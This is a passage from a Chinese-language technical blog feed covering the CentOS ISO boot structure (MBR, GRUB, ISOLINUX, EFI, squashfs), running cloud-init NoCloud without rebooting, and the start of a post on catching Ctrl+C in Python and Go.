repodata</span><br><span class="line">├── RPM-GPG-KEY-CentOS-7</span><br><span class="line">├── RPM-GPG-KEY-CentOS-Testing-7</span><br><span class="line">└── TRANS.TBL</span><br></pre></td></tr></table></figure><h2 id="isolinux"><a href="#isolinux" class="headerlink" title="isolinux"></a>isolinux</h2><h3 id="ISO-9660"><a href="#ISO-9660" class="headerlink" title="ISO 9660"></a>ISO 9660</h3><p>ISO 9660 是一种文件系统，也是一种规范，它规定了 ISO 文件应该是什么样子，常见的 Linux 发行版 ISO 都符合该规范。</p><h3 id="引导"><a href="#引导" class="headerlink" title="引导"></a>引导</h3><p>有了 ISO，有了计算机，那么我们需要使用 ISO 安装想要的操作系统，通常我们会将 ISO 通过光盘/USB/网络等方式挂载到计算机上，通过设置 BIOS/UEFI 选项，将启动项设置为 ISO，然后启动进行安装。接下来一个一个来说。</p><p>BIOS/UEFI 通常存放在闪存中，在计算机开机自检完成后，加载引导程序（bootloader），这个初始化过程称为引导。BIOS/UEFI 通常允许用户设置加载选项，即从系统的众多设备中按照顺序进行加载，常见的比如：硬盘、光盘、网络、USB 等。当第一个设备加载失败后，会尝试第二个设备，以此类推，如果最终所有设备都无法加载，那么系统处于开机但未引导状态。</p><h4 id="磁盘引导"><a href="#磁盘引导" class="headerlink" title="磁盘引导"></a>磁盘引导</h4><p>如果从硬盘引导，那么计算机首先会读取 MBR（主引导记录 or 主引导扇区），MBR 在硬盘上的三维地址为（柱面，磁头，扇区）＝（0，0，1）。有时也将其开头的 446 字节内容特指为“主引导记录”（MBR），其后是4个16字节的“磁盘分区表”（DPT），以及2字节的结束标志（55AA）。</p><p>也就是说，如果我们的磁盘是一个包含 MBR 的磁盘，那么它的 446 字节到 446 + 16 * 4 = 510 字节部分是引导记录，而 510 字节地址记录的应该是 <code>55AA</code> 这个结束标志，我们来找个磁盘看下是否是这样：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-30-250:/tmp</span><br><span class="line"><span class="meta"> $</span><span class="bash"> dd <span class="keyword">if</span>=/dev/vda of=a bs=512 count=1</span></span><br><span class="line">记录了1+0 的读入</span><br><span class="line">记录了1+0 的写出</span><br><span class="line">512字节(512 B)已复制，0.000403482 秒，1.3 MB/秒</span><br><span class="line">root@yiran-30-250:/tmp</span><br><span class="line"><span class="meta"> $</span><span class="bash"> hexdump a</span></span><br><span class="line">0000000 63eb 1090 d08e 00bc b8b0 0000 d88e c08e</span><br><span class="line">...</span><br><span class="line">00001f0 0000 0000 0000 0000 0000 0000 0000 aa55</span><br><span class="line">0000200</span><br></pre></td></tr></table></figure><p>在确认了磁盘可引导之后，BIOS 将 MBR 中的 446 字节内容复制到内存中，并将控制权转给引导设备（即磁盘），之后根据 MBR 中的引导程序（bootloader）进行后续工作。这里 UEFI 与 BIOS 略有不同，UEFI 是通过查找磁盘上 FAT 分区中加载 EFI loader 来进行引导，可以说 UEFI 是基于文件系统的。</p><p>到这里，我们已经进行了引导的第一步，也是最关键的一步，那么现在运行的 bootloader 是什么呢？Linux 常见的有两种：LILO 全称 LInux LOader，是一种 Linux 引导程序，它自身很简单，甚至说简陋，目前使用场景很少。GRUB 全称 GNU GRUB，是一种引导程序，它允许启动不同的操作系统或者不同的内核，目前大多数 Linux 发行版均采用 GRUB 作为引导程序。</p><p>当引导程序为 GRUB 时，因为 MBR 大小有限，因此存放在 MBR 中的内容是 boot.img，作用是加载真正的 GRUB core.img，GRUB 运行后，会根据 grub.cfg 选项来加载真正的内核映像，并进入到 OS 启动阶段。</p><p>GRUB 加载的文件有两个：vmlinuz 和 initrd.img 。</p><p>vmlinuz(vmlinux)，压缩后可引导的 Linux kernel 内核映像，VM 代表 Virtual Memory，通常是 bzImage 格式。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-30-250:/boot</span><br><span class="line"><span class="meta"> $</span><span class="bash"> file vmlinuz-3.10.0-693.11.6.el7.x86_64</span></span><br><span class="line">vmlinuz-3.10.0-693.11.6.el7.x86_64: Linux kernel x86 boot executable bzImage, version 3.10.0-693.11.6.el7.x86_64 (builder@kbuilder.dev.centos.org) #1, RO-rootFS, swap_dev 0x5, Normal VGA</span><br></pre></td></tr></table></figure><p>initramfs.img（init ramdisk.img），有了可引导的内核映像还不够，因为我们不能确保我们的硬件设备是 kernel 可以直接识别的，往往需要加载一些启动来保证硬件的识别，这时候就需要 initramfs.img 来提供一个临时文件系统，运行在内存中。</p><p>有时候我们也会看到 initrd.img 文件，initrd 是 initramfs 出现之前的方式，因为它内部有文件系统，运行在内存中造成了一定的空间浪费，而 initramfs 是 tmpfs，在使用上更方便。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-30-250:/boot</span><br><span class="line"><span class="meta"> $</span><span class="bash"> file initrd-plymouth.img</span></span><br><span class="line">initrd-plymouth.img: gzip compressed data, from Unix, last modified: Wed Mar 28 13:41:54 2018, max compression</span><br><span class="line">root@yiran-30-250:/boot</span><br><span class="line"><span class="meta"> $</span><span class="bash"> file initramfs-3.10.0-693.11.6.el7.x86_64.img</span></span><br><span class="line">initramfs-3.10.0-693.11.6.el7.x86_64.img: ASCII cpio archive (SVR4 with no CRC)</span><br></pre></td></tr></table></figure><p>到这里已经比较清楚了，接下来就是挂载相应配置的文件系统，执行 systemd（pid 为1）的进程，这里不再详细描述。</p><h4 id="光盘引导"><a href="#光盘引导" class="headerlink" title="光盘引导"></a>光盘引导</h4><p>在介绍了常规的磁盘引导后，我们来看看光盘引导的流程。</p><p>根据 El-Torito 规范，BIOS 会读取 ISO 的准确地址进行判断，ISO 是否可以进行引导启动（在第 71 字节地址保存引导目录）。如果判断可引导，那么就加载对应的引导程序（bootloader）。</p><p>常见的引导程序有：SYSLINUX,ISOLINUX,PXELINUX,EXTLINUX 等，这些可以统称为 Syslinux，目前最常见的应该是 ISOLINUX。PXELINUX 用于从网络引导，EXTLINUX 用于 ext 系列文件系统引导。</p><p>注意：由于目前 UEFI 的普遍性，部分 LiveCD ISO 会同时带有 ISOLINUX 和 GRUB 两种引导程序。</p><p>我们来看看 ISO 中 isolinux 路径下放了什么文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"> $</span><span class="bash"> tree </span></span><br><span class="line">├── boot.cat # 启动目录</span><br><span class="line">├── boot.msg # 启动信息</span><br><span class="line">├── grub.conf # GRUB 配置文件</span><br><span class="line">├── initrd.img # 临时文件系统</span><br><span class="line">├── isolinux.bin # ISOLINUX 引导程序</span><br><span class="line">├── isolinux.cfg # ISOLINUX 引导配置文件</span><br><span class="line">├── memtest # 内存测试可执行文件</span><br><span class="line">├── splash.png # ISOLINUX 引导背景图片</span><br><span class="line">├── TRANS.TBL # 扩展文件名</span><br><span class="line">├── vesamenu.c32 # Menu 配置</span><br><span class="line">└── vmlinuz # 内核映像</span><br></pre></td></tr></table></figure><p>根据以上文件信息及用途描述，我们来看下光盘引导的大概流程：</p><ol><li>加载 isolinux.bin</li><li>加载 isolinux.cfg,vesamenu.c32,splash.png 生成启动菜单</li><li>根据选项决定是否加载 vmlinuz, initrd.img </li></ol><p>关于 isolinux 目录和 Linux 引导部分大概是这样，主要是要理清楚整个流程。</p><h2 id="EFI"><a href="#EFI" class="headerlink" title="EFI"></a>EFI</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"> $</span><span class="bash"> tree </span></span><br><span class="line">.</span><br><span class="line">├── BOOT</span><br><span class="line">│   ├── BOOTIA32.EFI  # 32位系统 EFI 启动程序</span><br><span class="line">│   ├── BOOTX64.EFI # 64位系统 EFI 启动程序</span><br><span class="line">│   ├── fonts # 字体</span><br><span class="line">│   │   ├── TRANS.TBL</span><br><span class="line">│   │   └── unicode.pf2</span><br><span class="line">│   ├── grub.cfg # GRUB 配置</span><br><span class="line">│   ├── grubia32.efi # GRUB 32位引导程序</span><br><span class="line">│   ├── grubx64.efi # GRUB 64位引导程序</span><br><span class="line">│   ├── mmia32.efi # 内存测试 32 位执行程序</span><br><span class="line">│   ├── mmx64.efi # 内存测试 64 位执行程序</span><br><span class="line">│   └── TRANS.TBL</span><br><span class="line">└── TRANS.TBL</span><br></pre></td></tr></table></figure><p>有了前面 isolinux 关于引导部分的介绍，这里 EFI 完全可以一一对应，如果计算器启动模式为 BIOS，那么是通过 ISOLINUX 引导，如果启动模式是 UEFI，那么是通过 EFI（GRUB）引导。</p><h2 id="images"><a href="#images" class="headerlink" title="images"></a>images</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"> $</span><span class="bash"> tree </span></span><br><span class="line">├── efiboot.img</span><br><span class="line">├── pxeboot</span><br><span class="line">│   ├── initrd.img</span><br><span class="line">│   ├── TRANS.TBL</span><br><span class="line">│   └── vmlinuz</span><br><span class="line">└── TRANS.TBL</span><br></pre></td></tr></table></figure><p>这个路径文件很突兀，没有什么配置文件，看上去系统也没有用到，其实这里是为了文件复用而把 vmlinuz 和 initrd.img 提取出来了，在 EFI 路径下的 BOOT/grub.cfg 中有很多选项都是使用的 pxeboot/vmlinuz 。当然它最大的作用也是跟路径名一样，images，当你要配置一个发行版作为网络安装时，需要对应的 vmlinuz 和 initrd.img，那么可以从这个路径下获取，不会造成我要通过 PXELINUX 引导，却需要去 EFI 路径下获取文件的困扰。</p><h2 id="LiveOS"><a href="#LiveOS" class="headerlink" title="LiveOS"></a>LiveOS</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"> $</span><span class="bash"> tree </span></span><br><span class="line">├── squashfs.img</span><br><span class="line">└── TRANS.TBL</span><br></pre></td></tr></table></figure><p>LiveOS，字面意思就是运行在内存中的 OS，现在大多数发行版为了让用户第一时间不用安装到磁盘上即可体验发行版的某些功能，而支持将 OS 运行在内存中，简单快捷。</p><blockquote><p>squashfs.img，是一套供Linux核心使用的GPL 开源只读压缩档案系统。Squashfs能够为档案系统内的档案、inode及目录结构进行压缩，并支援最大1024 千位元组的区段，以提供更大的压缩比。</p></blockquote><p>根据维基百科描述，squashfs.img 应该是包含了一个完整的 Linux映像的，我们来尝试挂载查看下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-30-250:/tmp</span><br><span class="line"><span class="meta"> $</span><span class="bash"> ls squashfs.img</span></span><br><span class="line">squashfs.img</span><br><span class="line">root@yiran-30-250:/tmp</span><br><span class="line"><span class="meta"> $</span><span class="bash"> file squashfs.img</span></span><br><span class="line">squashfs.img: Squashfs filesystem, little endian, version 4.0, 368572502 bytes, 3 inodes, blocksize: 131072 bytes, created: Tue Sep  5 21:35:03 2017</span><br><span class="line">root@yiran-30-250:/tmp</span><br><span class="line"><span class="meta"> $</span><span class="bash"> mount -t squashfs squashfs.img /tmp/yiran</span></span><br><span class="line">root@yiran-30-250:/tmp</span><br><span class="line"><span class="meta"> $</span><span class="bash"> ls /tmp/yiran/LiveOS/rootfs.img</span></span><br><span class="line">/tmp/yiran/LiveOS/rootfs.img</span><br><span class="line">root@yiran-30-250:/tmp</span><br><span class="line"><span class="meta"> $</span><span class="bash"> file /tmp/yiran/LiveOS/rootfs.img</span></span><br><span class="line">/tmp/yiran/LiveOS/rootfs.img: Linux rev 1.0 ext4 filesystem data, UUID=e2fddbe2-a003-4b98-b272-3defe7b377c4, volume name "Anaconda" (extents) (64bit) (huge files)</span><br><span class="line">root@yiran-30-250:/tmp</span><br><span class="line"><span class="meta"> $</span><span class="bash"> mount /tmp/yiran/LiveOS/rootfs.img /tmp/yiran-root</span></span><br><span class="line">root@yiran-30-250:/tmp</span><br><span class="line"><span class="meta"> $</span><span class="bash"> ls /tmp/yiran-root</span></span><br><span class="line">bin  dev  etc  firmware  lib  lib64  lost+found  mnt  modules  proc  root  run  sbin  sys  tmp  usr  var</span><br></pre></td></tr></table></figure><p>既然是一个完整的 Linux 映像，我们可以直接通过 chroot 命令切换根目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran-30-250 00:24:30 yiran-root]$pwd</span><br><span class="line">/tmp/yiran-root</span><br><span class="line">[root@yiran-30-250 00:24:31 yiran-root]$ls</span><br><span class="line">bin  dev  etc  firmware  lib  lib64  lost+found  mnt  modules  proc  root  run  sbin  sys  tmp  usr  var</span><br><span class="line">[root@yiran-30-250 00:24:32 yiran-root]$chroot .</span><br><span class="line">bash: /var/log/bash.log: 只读文件系统</span><br><span class="line">[root@yiran-30-250 16:24:34 /]$cat /etc/hosts</span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">bash: /var/log/bash.log: 只读文件系统</span><br><span class="line">[root@yiran-30-250 16:24:36 /]$exit</span><br></pre></td></tr></table></figure><p>因为文件系统是只读的，所以我们只是进行了简单的读取操作。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过 CentOS 发行版，我们一点点从计算机上电开始，走通整个流程，这只是一个最简单的流程，之前博客也多少提到过通过 KickStart 或者其他自动化方式安装等方式，这里不再描述。</p><p>在做事情之前最好把整个流程想通，再去研究细节部分。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://wiki.osdev.org/ISO_9660#The_Boot_Record" target="_blank" rel="noopener">https://wiki.osdev.org/ISO_9660#The_Boot_Record</a></li><li><a href="https://wiki.syslinux.org/wiki/index.php?title=Doc/isolinux" target="_blank" rel="noopener">https://wiki.syslinux.org/wiki/index.php?title=Doc/isolinux</a></li><li><a href="https://wiki.osdev.org/El-Torito" target="_blank" rel="noopener">https://wiki.osdev.org/El-Torito</a></li><li><a href="https://wiki.syslinux.org/wiki/index.php?title=ISOLINUX" target="_blank" rel="noopener">https://wiki.syslinux.org/wiki/index.php?title=ISOLINUX</a></li><li><a href="https://zh.wikipedia.org/wiki/SquashFS" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/SquashFS</a></li><li></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;在平时工作中我自己可能80% 的时间都在使用 Linux 进行工作，无论是软件开发还是环境维护，那么对于 Linux 发行版自然也是有比较熟
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://zdyxry.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Cloud-init 无需重启执行配置</title>
    <link href="https://zdyxry.github.io/2019/11/29/Cloud-init-%E6%97%A0%E9%9C%80%E9%87%8D%E5%90%AF%E6%89%A7%E8%A1%8C/"/>
    <id>https://zdyxry.github.io/2019/11/29/Cloud-init-无需重启执行/</id>
    <published>2019-11-29T13:35:26.000Z</published>
    <updated>2019-11-29T14:04:35.964Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近在折腾 Cluster API 的时候，因为目前社区中比较成熟的方案是通过 Cloud-init 执行 kubeadm 命令部署 k8s ，因此需要使用 Cloud-init 进行功能验证，但是 Cloud-init 通常执行的前提条件是系统初次启动时，自动执行配置，这点对于调试很不友好，因此需要找到一个无需重启即可执行 Cloud-init 配置的方式。</p><h2 id="Cloud-init"><a href="#Cloud-init" class="headerlink" title="Cloud-init"></a>Cloud-init</h2><p>使用过公有云或者私有云的同学应该都知道在创建虚拟机的时候可以传递一个脚本用于在机器置备的时候执行某些动作，尤其在批量执行的时候，通常会很方便。这个其实就是 Cloud-init 所做的工作，就跟它的名字一样，针对 Cloud 场景执行 init 动作。</p><p>引用官网介绍：</p><blockquote><p>Cloud-init is the industry standard multi-distribution method for cross-platform cloud instance initialization. It is supported across all major public cloud providers, provisioning systems for private cloud infrastructure, and bare-metal installations. </p></blockquote><h2 id="NoCloud"><a href="#NoCloud" class="headerlink" title="NoCloud"></a>NoCloud</h2><p>Cloud-init 官方支持云平台种类很多常见的公有云如 Aliyun、AWS、Azure，常见的私有云解决方案如 OpenStack、ZStack、OVF 等都有支持。</p><p>但是如果我不使用已经支持的私有云，而是自己通过 Libvirt 配合 Ceph 实现了一套虚拟化平台，想要使用 Cloud-init，则可以使用 ConfigDrive 或者 NoCloud 方式。本文采用的是 NoCloud 方式。</p><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>使用默认配置就好，Cloud-init 在没有指定 Datasource 的情况下，会自己依次尝试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># cat /etc/cloud/cloud.cfg</span></span><br><span class="line">users:</span><br><span class="line"> - default</span><br><span class="line"></span><br><span class="line">disable_root: 1</span><br><span class="line">ssh_pwauth:   0</span><br><span class="line"></span><br><span class="line">mount_default_fields: [~, ~, <span class="string">'auto'</span>, <span class="string">'defaults,nofail,x-systemd.requires=cloud-init.service'</span>, <span class="string">'0'</span>, <span class="string">'2'</span>]</span><br><span class="line">resize_rootfs_tmp: /dev</span><br><span class="line">ssh_deletekeys:   0</span><br><span class="line">ssh_genkeytypes:  ~</span><br><span class="line">syslog_fix_perms: ~</span><br><span class="line">disable_vmware_customization: <span class="literal">false</span></span><br></pre></td></tr></table></figure><h3 id="Metadata"><a href="#Metadata" class="headerlink" title="Metadata"></a>Metadata</h3><p>这里我们指定 NoCloud 的路径，并配置 Metadata 文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost nocloud]# pwd</span><br><span class="line">/var/lib/cloud/seed/nocloud</span><br><span class="line">[root@localhost nocloud]# cat meta-data</span><br><span class="line">instance-id: yiran</span><br><span class="line">hostname: yiran</span><br></pre></td></tr></table></figure><h3 id="Userdata"><a href="#Userdata" class="headerlink" title="Userdata"></a>Userdata</h3><p>我们在 Cloud-init 自动配置时，执行命令 echo 保存信息到文件中</p><figure class="highlight plain"><figcaption><span>l l</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost nocloud]# pwd</span><br><span class="line">/var/lib/cloud/seed/nocloud</span><br><span class="line">[root@localhost nocloud]# cat user-data</span><br><span class="line">## template: jinja</span><br><span class="line">#cloud-config</span><br><span class="line"></span><br><span class="line">runcmd:</span><br><span class="line">  - &apos;echo yiran test cloud-init with nocloud &gt; /root/file&apos;</span><br></pre></td></tr></table></figure><h2 id="手动执行-Cloud-init"><a href="#手动执行-Cloud-init" class="headerlink" title="手动执行 Cloud-init"></a>手动执行 Cloud-init</h2><p>在了解 Cloud-init 工作流程后执行比较简单，因此这里直接贴出操作步骤：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# pwd</span><br><span class="line">/root</span><br><span class="line">[root@localhost ~]# ls</span><br><span class="line">anaconda-ks.cfg</span><br><span class="line">[root@localhost ~]# cloud-init init</span><br><span class="line">Cloud-init v. 18.5 running 'init' at Fri, 29 Nov 2019 14:02:10 +0000. Up 635.10 seconds.</span><br><span class="line">ci-info: +++++++++++++++++++++++++++++++++++++++Net device info+++++++++++++++++++++++++++++++++++++++</span><br><span class="line">ci-info: +--------+------+------------------------------+---------------+--------+-------------------+</span><br><span class="line">ci-info: | Device |  Up  |           Address            |      Mask     | Scope  |     Hw-Address    |</span><br><span class="line">ci-info: +--------+------+------------------------------+---------------+--------+-------------------+</span><br><span class="line">ci-info: |  eth0  | True |        192.168.77.158        | 255.255.240.0 | global | 52:54:00:2f:d9:44 |</span><br><span class="line">ci-info: |  eth0  | True | fe80::108b:ab9c:1a1a:9ab8/64 |       .       |  link  | 52:54:00:2f:d9:44 |</span><br><span class="line">ci-info: |   lo   | True |          127.0.0.1           |   255.0.0.0   |  host  |         .         |</span><br><span class="line">ci-info: |   lo   | True |           ::1/128            |       .       |  host  |         .         |</span><br><span class="line">ci-info: +--------+------+------------------------------+---------------+--------+-------------------+</span><br><span class="line">ci-info: +++++++++++++++++++++++++++++++Route IPv4 info+++++++++++++++++++++++++++++++</span><br><span class="line">ci-info: +-------+--------------+----------------+---------------+-----------+-------+</span><br><span class="line">ci-info: | Route | Destination  |    Gateway     |    Genmask    | Interface | Flags |</span><br><span class="line">ci-info: +-------+--------------+----------------+---------------+-----------+-------+</span><br><span class="line">ci-info: |   0   |   0.0.0.0    | 192.168.64.215 |    0.0.0.0    |    eth0   |   UG  |</span><br><span class="line">ci-info: |   1   | 192.168.64.0 |    0.0.0.0     | 255.255.240.0 |    eth0   |   U   |</span><br><span class="line">ci-info: +-------+--------------+----------------+---------------+-----------+-------+</span><br><span class="line">ci-info: +++++++++++++++++++Route IPv6 info+++++++++++++++++++</span><br><span class="line">ci-info: +-------+-------------+---------+-----------+-------+</span><br><span class="line">ci-info: | Route | Destination | Gateway | Interface | Flags |</span><br><span class="line">ci-info: +-------+-------------+---------+-----------+-------+</span><br><span class="line">ci-info: |   9   |  fe80::/64  |    ::   |    eth0   |   U   |</span><br><span class="line">ci-info: |   10  |  fe80::/64  |    ::   |    eth0   |   U   |</span><br><span class="line">ci-info: |   14  |   ff00::/8  |    ::   |    eth0   |   U   |</span><br><span class="line">ci-info: +-------+-------------+---------+-----------+-------+</span><br><span class="line">[root@localhost ~]# cloud-init modules -m config</span><br><span class="line">Cloud-init v. 18.5 running 'modules:config' at Fri, 29 Nov 2019 14:02:18 +0000. Up 643.31 seconds.</span><br><span class="line">[root@localhost ~]# cloud-init modules -m final</span><br><span class="line">Cloud-init v. 18.5 running 'modules:final' at Fri, 29 Nov 2019 14:02:21 +0000. Up 646.27 seconds.</span><br><span class="line">ci-info: no authorized ssh keys fingerprints found for user centos.</span><br><span class="line">Cloud-init v. 18.5 finished at Fri, 29 Nov 2019 14:02:21 +0000. Datasource DataSourceNoCloudNet [seed=/var/lib/cloud/seed/nocloud][dsmode=net].  Up 646.44 seconds</span><br><span class="line">[root@localhost ~]# ls</span><br><span class="line">anaconda-ks.cfg  file</span><br><span class="line">[root@localhost ~]# cat file</span><br><span class="line">yiran test cloud-init with nocloud</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://cloudinit.readthedocs.io/en/latest/" target="_blank" rel="noopener">https://cloudinit.readthedocs.io/en/latest/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;最近在折腾 Cluster API 的时候，因为目前社区中比较成熟的方案是通过 Cloud-init 执行 kubeadm 命令部署 k8s
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://zdyxry.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>如何捕捉 Ctrl+C 指令</title>
    <link href="https://zdyxry.github.io/2019/11/23/%E5%A6%82%E4%BD%95%E6%8D%95%E6%8D%89-Ctrl-C-%E6%8C%87%E4%BB%A4/"/>
    <id>https://zdyxry.github.io/2019/11/23/如何捕捉-Ctrl-C-指令/</id>
    <published>2019-11-23T13:23:24.000Z</published>
    <updated>2019-11-23T13:43:11.109Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>有时候在运行代码的时候，想要程序在接收到 Ctrl+C 指令的时候做一些平滑的处理，来写一下在 Python 和 Golang 中如何接收 Ctrl+C 指令。</p><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_program</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        print(<span class="string">"Test code..."</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit_gracefully</span><span class="params">(signum, frame)</span>:</span></span><br><span class="line">    signal.signal(signal.SIGINT, original_sigint)</span><br><span class="line">    print(<span class="string">"Receive Ctrl+C."</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    original_sigint = signal.getsignal(signal.SIGINT)</span><br><span class="line">    signal.signal(signal.SIGINT, exit_gracefully)</span><br><span class="line">    run_program()</span><br></pre></td></tr></table></figure><h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 